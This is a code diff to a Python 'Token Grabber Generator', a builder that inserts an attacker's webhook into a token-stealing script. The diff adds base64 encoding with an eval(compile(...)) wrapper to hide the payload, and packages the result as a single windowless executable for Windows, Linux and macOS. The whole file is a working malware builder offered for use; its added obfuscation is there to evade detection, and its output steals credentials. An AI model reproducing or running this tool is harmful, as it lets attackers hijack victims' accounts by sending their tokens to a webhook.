@@ -1,21 +1,35 @@
 from sys import platform
 import argparse
+import subprocess
+import base64
 
 class Builder:
 
-    def __init__(self, webhook, out_file, os):
-        self.path_to_pyarmor = os.path.expanduser('~/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Scripts/pyarmor.exe')
+    def __init__(self, webhook, out_file, os): 
         self.webhook = webhook
         self.out_file = out_file
         self.os = os
+        if self.os == "Linux":
+            self.path_to_pyinstaller = os.path.expanduser('~/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Scripts/pyinstaller.exe')
 
     def build(self):        
         f = open("code/token_grabber.py", 'r')
         file = f.read()
         f.close()
         newfile = file.replace("{WEBHOOK}", str(self.webhook))
+        encoded = base64.b64encode(newfile.encode())
         f = open(self.out_file+".py", 'w')
-        f.write(newfile)
+        f.write("import base64\n")
+        f.write("import os\n")
+        f.write("from sys import platform\n")
+        f.write("from platform import node\n")
+        f.write("from getpass import getuser\n")
+        f.write("from re import findall\n")
+        f.write("from json import loads, dumps\n")
+        f.write("from base64 import b64decode\n")
+        f.write("from urllib.request import Request, urlopen\n")
+        f.write("import ssl\n")
+        f.write(f"eval(compile(base64.b64decode({encoded}).decode(), '<string>', 'exec'))")
         f.close()
 
         if self.os == "Linux":
@@ -28,21 +42,21 @@ class Builder:
             print("\nOS not supported\n")
 
     def packageLinux(self):
-        compile_command = ["wine", self.path_to_pyarmor, '--clean -e " --onefile --noconsole --icon=img/exe_file.ico"', self.out_file+".py"]
+        compile_command = ["wine", self.path_to_pyinstaller, "--onefile", "--noconsole", self.out_file+".py"]
         subprocess.call(compile_command)
 
     def packageWindows(self):
-        compile_command = ["venv/Scripts/pyarmor.exe", '--clean -e " --onefile --noconsole --icon=img/exe_file.ico"', self.out_file+".py"]
+        compile_command = ["venv/Scripts/pyinstaller.exe", "--onefile", "--noconsole", self.out_file+".py"]
         subprocess.call(compile_command)
 
     def packageOSX(self):
-        #Add manual obfuscation and pyinstaller command
-        pass
+        compile_command = ["pyinstaller", "--onefile", "--noconsole", self.out_file+".py"]
+        subprocess.call(compile_command)
 
 def getArgs():
     parser = argparse.ArgumentParser(description='Token Grabber Generator')
-    parser.add_argument('-w', '--webhook', help='Add your webhook', action='store_true')
-    parser.add_argument('-o', '--outfile', help='Name your Executable', action='store_true')    
+    parser.add_argument('-w', '--webhook', help='Add your webhook', default='1')
+    parser.add_argument('-o', '--outfile', help='Name your Executable', default='2')    
     return parser.parse_args()
 
 def checkOS():
@@ -57,27 +71,28 @@ def checkOS():
     return OS
 
 arguments = getArgs()
-if not arguments.webhook or not arguments.outfile:
+if not arguments.webhook or not arguments.outfile or not arguments.webhook and not arguments.outfile:
     print("\n[-] Please Make Sure You Have Provided A Webhook And An Output File Name")
 
-webhook = arguments.webhook
-out_file = arguments.outfile
-OS = checkOS()
+else:
+    webhook = arguments.webhook
+    out_file = arguments.outfile
+    OS = checkOS()
 
-print('''
-████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗     ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗ 
-╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
-   ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║    ██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝
-   ██║   ██║   ██║██╔═██╗ ██╔══╝  ██║╚██╗██║    ██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗
-   ██║   ╚██████╔╝██║  ██╗███████╗██║ ╚████║    ╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║
-   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝                                                                                                         
+    print('''
+    ████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗     ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗ 
+    ╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
+       ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║    ██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝
+       ██║   ██║   ██║██╔═██╗ ██╔══╝  ██║╚██╗██║    ██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗
+       ██║   ╚██████╔╝██║  ██╗███████╗██║ ╚████║    ╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║
+       ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝                                                                                                         
 
-Made By Dimitris Kalopisis & Yuliy Mitryashkin | Twitter: @DKalopisis & @JM1k1
-''')
+    Made By Dimitris Kalopisis & Yuliy Mitryashkin | Twitter: @DKalopisis & @JM1k1
+    ''')
 
-try:
-    print("\n[+] Generating Token Grabber, please wait...")
-    Builder(webhook, out_file, OS).build()
-    print("\n[+] Succesfully Generated Token Grabber\nYou can find it inside the dist directory")
-except Exception as e:
-    print(f"\n[-] An ERROR has occurred:\n{e}")
+    try:
+        print("\n[+] Generating Token Grabber, please wait...")
+        Builder(webhook, out_file, OS).build()
+        print("\n[+] Succesfully Generated Token Grabber\nYou can find it inside the dist directory")
+    except Exception as e:
+        print(f"\n[-] An ERROR has occurred:\n{e}")
